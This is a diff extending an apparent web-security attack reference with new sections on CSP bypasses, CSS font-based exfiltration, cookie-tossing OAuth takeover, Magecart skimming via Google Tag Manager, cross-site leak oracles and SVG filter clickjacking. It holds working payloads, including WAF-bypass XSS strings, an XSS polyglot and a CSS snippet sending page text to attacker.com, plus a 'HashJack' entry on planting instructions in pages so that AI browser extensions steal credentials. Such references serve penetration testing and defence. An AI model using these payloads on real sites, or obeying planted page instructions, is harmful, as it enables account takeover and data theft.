@@ -53,6 +53,23 @@
 
 **Key insight:** Most events work on undefined/custom tags like `<xss>`, making tag-based WAF allowlists ineffective.
 
+**CSP bypass via allowlisted analytics exfiltration:**
+- Applications with `connect-src` allowing analytics domains (e.g., `insights-collector.newrelic.com`) can be exploited by redirecting token POST to New Relic Custom Events API
+- Exfiltrated data stored as queryable NRQL events — no CSP mutation needed
+- Generalizes to any allowlisted third-party endpoint accepting arbitrary POST data
+
+**CSP nonce bypass via bfcache / disk cache:**
+1. CSS attribute selectors exfiltrate nonce from cached page
+2. Cache-key manipulation forces browser to load modified content from disk cache
+3. On back-navigation, bfcache serves old nonce with new injected content
+4. Nonce-based CSP bypassed without server issuing same nonce twice
+
+**CRLF nested response splitting CSP gadget:**
+- First CRLF split injects HTTP response whose body contains a *second* CRLF split
+- Second split emits truncated JavaScript executing in same origin
+- `Content-Length`/`Transfer-Encoding` manipulation controls parser boundary
+- Script appears same-origin → bypasses CSP entirely
+
 ### WAF-Specific XSS Bypasses
 
 | WAF | Bypass Payload |
@@ -61,6 +78,19 @@
 | **ModSecurity** | `<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain)>` |
 | **Wordfence** | `<meter onmouseover="alert(1)"`, `><marquee loop=1 width=0 onfinish=alert(1)>` |
 | **Incapsula** | `<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>`, `<img/src=q onerror='new Function\`al\\ert\\`1\\`\`'>` |
+
+### Fontleak (CSS Font Exfiltration Without JS)
+
+CSS `@font-face` with `unicode-range` per character + unique font URL per codepoint. Browser only fetches font if matching character exists in target element — exfiltrates text content character-by-character without JavaScript execution.
+
+```css
+@font-face { font-family: leak; src: url(https://attacker.com/?c=a); unicode-range: U+0061; }
+@font-face { font-family: leak; src: url(https://attacker.com/?c=b); unicode-range: U+0062; }
+/* ... one per character */
+.target { font-family: leak; }
+```
+
+Advantages over attribute selector exfiltration: leaks **text node content**, not just attribute values. Combinable with `content-visibility: auto` for triggering without viewport scroll.
 
 ### XSS Polyglot (Universal Payload)
 `jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
@@ -227,6 +257,53 @@ Tools: Posta (Chrome extension), DOM Invader (Burp), manual DevTools: `getEventL
 
 ---
 
+## Cookie Tossing → OAuth Hijacking
+
+Exploits the fact that cookies predate the Same-Origin Policy — a subdomain (`evil.sub.example.com`) can set cookies scoped to the parent domain (`example.com`).
+
+**Attack chain:**
+1. Attacker has XSS on any subdomain (even self-XSS on a low-value subdomain)
+2. Inject cookies with `Path=/oauth/callback` scoped to parent domain
+3. Overwrite victim's OAuth `state` parameter cookie
+4. Victim's OAuth flow uses attacker-controlled `state` → attacker links their IdP account to victim's session → ATO
+
+**Key innovation:** Weaponizes self-XSS (normally zero-impact) and low-value subdomain XSS into full OAuth account takeover. Path-scoped cookie injection targeting only OAuth endpoints is the critical technique.
+
+Source: Elliot Ward / Snyk Labs, 2024.
+
+## HashJack (AI Browser Extension Injection)
+
+AI-powered browser extension manipulation — inject malicious instructions into DOM content that AI browser extensions (Copilot, ChatGPT extensions, etc.) process. Extension executes attacker's commands in browser context with extension permissions, enabling auth flow interception, credential theft, and session hijacking.
+
+## PDF.js Arbitrary Code Execution (CVE-2024-4367)
+
+Font rendering vulnerability in Mozilla's PDF.js library allows arbitrary JavaScript execution when rendering malicious PDFs. Affects:
+- All Firefox users viewing PDFs (PDF.js is built-in)
+- Any web application embedding PDF.js for document viewing
+- Electron apps using PDF.js
+
+**Impact:** Open a crafted PDF → XSS in the PDF viewer's origin context. If the viewer runs on a sensitive domain, attacker gets full same-origin access.
+
+## Magecart via GTM CSS Content Carrier (2025)
+
+Evolved Magecart skimming technique using Google Tag Manager as a living-off-the-land delivery mechanism:
+
+1. Compromise GTM container → load second GTM container
+2. Second container loads a fake CSS file
+3. JavaScript payload hidden inside CSS `::before { content: "..." }` property
+4. Third GTM container extracts and `eval()`s the hidden JS from the `<link>` element's computed style
+5. Payload establishes WebSocket to C2 for real-time card data exfiltration
+
+**Why it evades detection:**
+- GTM domains commonly in CSP allowlists
+- CSS file passes static analysis (no `<script>` tags)
+- Triple-container indirection defeats Magecart detection rules
+- WebSocket exfil bypasses network-level content inspection
+
+Source: Recorded Future H1-2025 Malware Trends.
+
+---
+
 ### Reverse Tabnabbing
 
 When a page opens a link with `target="_blank"` without `rel="noopener"`, the opened page gets a reference to the opener via `window.opener`. The opened page can then navigate the opener to a phishing page:
@@ -355,6 +432,10 @@ Browser only fetches font if target contains matching characters.
 - `:has()` technique works entirely within existing page styles
 - No JavaScript execution needed for any CSS exfiltration technique
 
+### PHP Quirks Mode CSS Exfiltration
+
+When PHP renders HTML without a DOCTYPE (quirks mode), CSS parsing rules differ — `background:url()` in `::before`/`::after` content properties becomes exploitable in contexts where `@import` is blocked. Quirks mode also affects how browsers handle malformed CSS, enabling exfiltration vectors that fail in standards mode.
+
 ### cross-fade() Recursive Exfiltration (Proton Mail Research)
 
 Advanced CSS exfiltration technique using nested `cross-fade()` CSS function to assign multiple background URLs to a single element — each URL triggers a separate fetch, enabling parallel character extraction.
@@ -463,6 +544,14 @@ Cross-site information leakage without XSS — a distinct attack class exploitin
 - Pages without `Cross-Origin-Opener-Policy` retain `window.opener` reference — attacker can poll `opener.location`, `opener.frames`
 - Pages with `COOP: same-origin` break opener reference — observable as side channel (breaks attacker's probe)
 
+### Cross-Site ETag Length Leak
+
+Libraries like `jshttp/etag` encode response size in hex: `W/"[size_hex]-[timestamp_hex]"`. When response crosses a hex boundary (e.g., `0xfff` → `0x1000`), ETag gains one byte. On repeat navigation, browser sends `If-None-Match` with previous ETag — extra byte pushes total headers over Node.js 16 KiB `--max-http-header-size` limit → `431 Request Header Fields Too Large` detectable cross-origin as binary oracle for response size inference.
+
+### Chrome Connection Pool Ordering Oracle
+
+Chrome limits connections to 256 total, 6 per origin. Pending requests sorted alphabetically by port/scheme/host. Exhaust pool → observe completion order to infer cross-origin redirect destinations (e.g., `a.target.com` vs `z.target.com`) without reading response. Leaks redirect targets, revealing auth state or user identity.
+
 ### Impact
 - Detect authentication state (logged in vs. logged out)
 - Enumerate private resources (does `/admin/report/123` exist?)
@@ -476,6 +565,26 @@ Cross-site information leakage without XSS — a distinct attack class exploitin
 - `SameSite=Lax/Strict` cookies — prevents cross-site requests from carrying credentials
 - Constant-time responses regardless of authentication state
 - `Vary: Cookie` with `Cache-Control: private` on authenticated resources
+
+---
+
+## SVG Filter Clickjacking 2.0 (2025)
+
+Cross-origin pixel reading via SVG filter primitives applied to iframes in Chrome. Bypasses X-Frame-Options, CSP `frame-ancestors`, and all frame-busting defenses.
+
+**Mechanism:**
+1. SVG filter primitives (`feColorMatrix`, `feDisplacementMap`, `feBlend`, `feComposite`) can be applied to cross-origin iframes
+2. Composing primitives into logic gates (AND, OR, XOR) creates a Turing-complete computation layer in the rendering engine
+3. Attacker overlay reads real UI state (dialog open, checkbox checked, OTP displayed) and dynamically adjusts fake UI
+4. Pixel data can be encoded into QR codes generated entirely within SVG filters
+
+**Key properties:**
+- Operates at rendering/compositor level — not blocked by framing defenses
+- Cross-origin pixel read violates same-origin policy at visual layer
+- No current browser fix exists
+- Enables interactive, state-aware clickjacking (adapts to victim's actual page content)
+
+Source: Lyra Horse, 2025.
 
 ---
 
